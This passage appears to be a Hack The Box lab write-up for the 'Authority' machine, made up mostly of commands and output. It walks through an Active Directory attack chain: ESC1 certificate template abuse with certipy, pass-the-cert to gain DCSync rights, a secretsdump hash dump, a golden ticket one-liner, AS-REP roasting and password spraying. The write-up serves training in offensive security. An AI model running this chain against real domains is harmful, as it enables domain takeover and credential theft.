## Login as `svc_ldap`

```bash
┌──(kali㉿kali)-[~/htb/Authority]
└─$ evil-winrm -i authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> ls C:\Users


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/17/2023   9:31 AM                Administrator
d-r---         8/9/2022   4:35 PM                Public
d-----        3/24/2023  11:27 PM                svc_ldap


*Evil-WinRM* PS C:\Users\svc_ldap\Documents> cat C:\Users\svc_ldap\Desktop\user.txt
efa4df8a7bcee09815a8f1217950fc62
```


# Root Flag
---

`svc_ldap` have no interesting groups and privilege tokens

```bash
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami /all

USER INFORMATION
----------------

User Name    SID
============ =============================================
htb\svc_ldap S-1-5-21-622327497-3269355298-2248959698-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```


## ADCS - Found vulnerable certificate template

```bash
┌──(kali㉿kali)-[~/htb/Authority]
└─$ cme ldap authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M adcs
SMB         authority.htb   445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
LDAPS       authority.htb   636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
ADCS        authority.htb   389    AUTHORITY        [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS                                                Found PKI Enrollment Server: authority.authority.htb
ADCS                                                Found CN: AUTHORITY-CA
```

> The latest update of python 3.11.4 broke **certipy** with the error : `[-] Got error: module 'enum' has no attribute '_decompose'`, 
> 
> **Use python 3.8 in virtual environment to make it work**
{: .prompt-warning }

```bash
┌──(kali㉿kali)-[~/htb/Authority]
└─$ source ~/venv-py3.8/bin/activate

┌──(venv-py3.8)─(kali㉿kali)-[~/htb/Authority]
└─$ certipy find -vulnerable -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Saved BloodHound data to '20230723054058_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20230723054058_Certipy.txt'
[*] Saved JSON output to '20230723054058_Certipy.json'

┌──(venv-py3.8)─(kali㉿kali)-[~/htb/Authority]
└─$ less 20230723054058_Certipy.txt
```

```bash
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

> Domain Computers are allowed enroll and tamper certificates
{: .prompt-warning }


## Abuse ESC1 - Template allows SAN

> **addcomputer.py Explained**
> > https://tools.thehacker.recipes/impacket/examples/addcomputer.py
{: .prompt-info }


### Request certificate to impersonate Administrator

1. Check if `MachineAccountQuota` is enough for domain user to create and join machine accounts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Authority]
└─$ cme ldap authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M maq
SMB         authority.htb   445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
LDAPS       authority.htb   636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
MAQ         authority.htb   389    AUTHORITY        [*] Getting the MachineAccountQuota
MAQ         authority.htb   389    AUTHORITY        MachineAccountQuota: 10
```

> `MachineAccountQuota` >=10 will do

2. Add a machine account

```bash
┌──(bravosec㉿fsociety)-[~/htb/Authority]
└─$ addcomputer.py -computer-name 'Test' -computer-pass Bravosec2023 -dc-host authority.htb -domain-netbios authority.thb -method LDAPS authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!'
Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

[*] Successfully added machine account Test$ with password Bravosec2023.
```

3. Request a certificate with the machine account which will impersonate **Administrator**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Authority]
└─$ certipy req -u 'Test$' -p 'Bravosec2023' -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn "Administrator@authority.htb"  -debug
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 12
[*] Got certificate with UPN 'Administrator@authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

### Pass The Cert to DCSync

> **Failed using **certipy****
> > `KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)`
{: .prompt-danger }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Authority]
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.222 -domain authority.htb
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
````

> **Fix The Error**
> It means that the KDC is not set up for Kerberos authentication
> 
>  Did a quick search on **certipy**'s github repo and found a [solution](https://github.com/ly4k/Certipy/issues/64#issuecomment-1199012623) from [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/)'s author'
{: .prompt-tip }

Extract cert and key from `pfx` file for **passthecert.py** to handle

```bash
certipy cert -pfx administrator.pfx -nokey -out admin.cert
certipy cert -pfx administrator.pfx -nocert -out admin.key
```

Give user **DCSync** rights

```bash
┌──(bravosec㉿fsociety)-[~/htb/Authority]
└─$ python /opt/sectools/ad/passthecert.py -action modify_user -crt admin.cert -key admin.key -domain authority.htb -dc-ip 10.10.11.222 -target 'Test$' -elevate
Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

[*] Granted user 'svc_ldap' DCSYNC rights!
```

Perform **DCSync**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Authority]
└─$ secretsdump.py authority.htb/'Test$':'Bravosec2023'@authority.htb -just-dc -outputfile secretsdump.txt
Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:74720c9f26c5864f214507863622313b:::
Test$:11601:aad3b435b51404eeaad3b435b51404ee:e52aa7ce3c956dd6cf2ccb3e3c79c096:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72c97be1f2c57ba5a51af2ef187969af4cf23b61b6dc444f93dd9cd1d5502a81
Administrator:aes128-cts-hmac-sha1-96:b5fb2fa35f3291a1477ca5728325029f
Administrator:des-cbc-md5:8ad3d50efed66b16
krbtgt:aes256-cts-hmac-sha1-96:1be737545ac8663be33d970cbd7bebba2ecfc5fa4fdfef3d136f148f90bd67cb
krbtgt:aes128-cts-hmac-sha1-96:d2acc08a1029f6685f5a92329c9f3161
krbtgt:des-cbc-md5:a1457c268ca11919
svc_ldap:aes256-cts-hmac-sha1-96:3773526dd267f73ee80d3df0af96202544bd2593459fdccb4452eee7c70f3b8a
svc_ldap:aes128-cts-hmac-sha1-96:08da69b159e5209b9635961c6c587a96
svc_ldap:des-cbc-md5:01a8984920866862
AUTHORITY$:aes256-cts-hmac-sha1-96:8c7ef783c8f03212cb975948b66946852eac6e5132d47389d53d89d8c7132dd9
AUTHORITY$:aes128-cts-hmac-sha1-96:99abae7a6286f28593e637515379e863
AUTHORITY$:des-cbc-md5:732aab6237130da8
Test$:aes256-cts-hmac-sha1-96:446abd8b772430773ba8ca6ea6445cd2521945b0b56fadb457cd75cdedc1cfe9
Test$:aes128-cts-hmac-sha1-96:6cd24d16d11aee50c47dfddd0b3fd467
Test$:des-cbc-md5:0bc18a5707cb948a
[*] Cleaning up...
```

*Optional : Remove elevated DACL from the machine account*

```bash
┌──(impacket-shutdownrepo-TDbuqu7G)─(bravosec㉿fsociety)-[/opt/sectools/ad/impacket-shutdownrepo]
└─$ dacledit.py -action 'remove' -rights 'FullControl' -principal 'Test$' -target-dn 'DC=authority,DC=htb' authority.htb/Test$:Bravosec2023 -use-ldaps
Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] DACL backed up to dacledit-20230803-072805.bak
[*] DACL modified successfully!
```

*Optional : Delete the machine account*

```bash
addcomputer.py -computer-name 'Test' -dc-host authority.htb -method LDAPS authority.htb/Administrator -hashes aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed -delete
```

## Login as Administrator via evil-winrm

Sync time with DC before kerberos authentication

```bash
┌──(kali㉿kali)-[~/htb/Authority]
└─$ sudo ntpdate authority.htb
[sudo] password for kali:
2023-07-23 05:09:33.736850 (+0800) -14155.274511 +/- 0.037008 authority.htb 10.10.11.222 s1 no-leap
CLOCK: time stepped by -14155.274511
```

Use my golden ticket one liner : )

```bash
export DOMAIN='authority.htb';export AESKEY=$(cat secretsdump.txt.ntds.kerberos|grep krbtgt|head -n1|cut -d":" -f3); export DOMAINSID=$(lookupsid.py $domain/'Administrator'@$DOMAIN 1 -hashes '0:'$(cat secretsdump.txt.ntds|grep Administrator|cut -d ":" -f 4)|tail -n1|cut -d ":" -f 2| xargs); ticketer.py -aesKey $AESKEY -domain-sid $DOMAINSID -domain $DOMAIN Administrator
```

```bash
Impacket v0.10.1.dev1+20230718.100545.fdbd2568 - Copyright 2022 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for authority.htb/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache
```

Configure kerberos for evil-winrm (Using NTLM authentication is not a good practice for OPSEC safe)

> Evil-Winrm Configuration script can be found here : https://gist.github.com/opabravo/ff9091dac9cf4267cd10ead8303a4b8a

```bash
┌──(bravosec㉿fsociety)-[~/htb/Authority]
└─$ export KRB5CCNAME=Administrator.ccache

┌──(bravosec㉿fsociety)-[~/htb/Authority]
└─$ sudo python ~/scripts/configure_krb5.py authority.htb authority
[*] Configuration Data:
[libdefault]
        default_realm = AUTHORITY.HTB

[realms]
        AUTHORITY.HTB = {
                kdc = authority.authority.htb
                admin_server = authority.authority.htb
        }

[domain_realm]
        authority.htb = AUTHORITY.HTB
        .authority.htb = AUTHORITY.HTB


[!] Above Configuration will overwrite /etc/krb5.conf, are you sure? [y/N] y
[+] /etc/krb5.conf has been configured
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Authority]
└─$ evil-winrm -r authority.htb -i authority.authority.htb

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
20556dd010f5495572ada93a0575b357
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

# Additional
---

## ASReproasting attempt

Extract pure usernames

```bash
cat cme_users.txt| grep SidTypeUser| awk '{print $6}' | cut -d "\\" -f 2 | tee users.txt
```

```bash
┌──(kali㉿kali)-[~/htb/Authority]
└─$ GetNPUsers.py authority.htb/ -request -usersfile users.txt -format hashcat -dc-ip authority.htb
Impacket v0.10.1.dev1+20230718.100545.fdbd256 - Copyright 2022 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User svc_ldap doesn't have UF_DONT_REQUIRE_PREAUTH set
```

## Password Spray attempt

Gathered some password from smb share to spray and seek for password reuse

```bash
┌──(kali㉿kali)-[~/htb/Authority]
└─$ cat passwords.txt
pWm_@dm!N_!23
DevT3st@123
!@#$%^&*
T0mc@tAdm1n
T0mc@tR00t
SuP3rS3creT
Welcome1
secret

┌──(kali㉿kali)-[~/htb/Authority]
└─$ cat users.txt
Administrator
Guest
svc_ldap
```

```bash
cme smb authority.htb -u users.txt -p passwords.txt
```

## Blood Hound

```bash
mkdir -p bloodhound-result && cd bloodhound-result && bloodhound-python -d authority.htb -ns 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -c all
```

## Bloodypy

> https://github.com/CravateRouge/bloodyAD

Found it from this blog : https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html

Though it did not work on this machine, it's still an interesting tool

> **Installation**
> ```bash
>apt-get install libkrb5-dev
>pipx install bloodyAD
>```
{: .prompt-info }


